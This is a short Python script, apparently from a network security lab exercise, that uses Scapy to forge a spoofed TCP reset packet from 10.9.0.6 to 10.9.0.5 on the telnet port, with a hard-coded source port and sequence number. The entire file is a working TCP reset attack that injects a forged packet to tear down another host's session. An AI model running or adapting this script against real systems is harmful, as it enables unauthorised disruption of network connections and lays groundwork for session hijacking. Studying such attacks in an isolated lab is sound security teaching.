#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=41504, dport=23, flags="R", seq=4212809324)
pkt = ip/tcp
send(pkt, verbose=0)
